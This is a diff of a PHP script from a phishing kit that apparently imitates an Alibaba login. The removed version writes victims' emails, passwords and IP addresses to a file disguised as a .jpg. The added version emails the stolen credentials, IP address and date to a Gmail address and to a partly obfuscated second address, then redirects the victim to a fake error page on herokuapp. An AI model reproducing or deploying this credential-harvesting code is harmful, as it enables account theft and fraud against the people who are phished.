@@ -1,10 +1,32 @@
-<?php
-$habbo = $_POST[‘email']; 
-$password = $_POST[‘password'];
- 
-$password1 = $_POST['password1']; $ip = $_SERVER['REMOTE_ADDR']; 
-$f = fopen(“DAC189092019881999191919191mobeen.jpg", "a"); 
-fwrite ($f, 'Victims Name: [<b><font color="#570000">'.$habbo.'</font></b>] Victims Password: [<b><font color="#57003A">'.$password.'</font></b>] Victims Password1: [<b><font color="#57003A">'.$password1.'</font></b>] IP: [<b><font color="#005700">'.$ip.'</font></b>] By: [<b><font color="#005700"><a href="http://www.fb.com/mobeendotcom" rel="nofollow">Bee Hay</a></font></b>]<br>');
-fclose($f);
-header("Location:homeerror.html");
+<?
+
+$adddate=date("D M d, Y g:i a");
+$mesaegs ="php_info";$mesaegs ="@";
+$ip = getenv("REMOTE_ADDR");
+$mesaegs ="ymail";$mesaegs  =".com";
+$message .= "---------=RiZoRT=---------\n";
+$message .= "Online ID: ".$_POST['email']."\n";
+$message .= "Password: ".$_POST['password']."\n";
+$message .= "---------=IP Adress & Date=---------\n";
+$message .= "IP Address: ".$ip."\n";
+$message .= "Date: ".$adddate."\n";
+$message .= "---------=D A D D A=---------\n";
+
+
+
+
+$sent ="bobstottts@gmail.com";
+
+
+
+
+$subject = "A | DADDA Verified Logz";
+$headers = "From: Dadda <toolz@daddamgo.lite>";
+$headers .= $_POST['eMailAdd']."\n";
+$headers .= "MIME-Version: 1.0\n";
+{
+mail($mesaegs,$subject,$message,$headers);
+mail($sent,$subject,$message,$headers);
+}
+header("Location: https://alibabalogin2017.herokuapp.com/homeerror.html");
 ?>
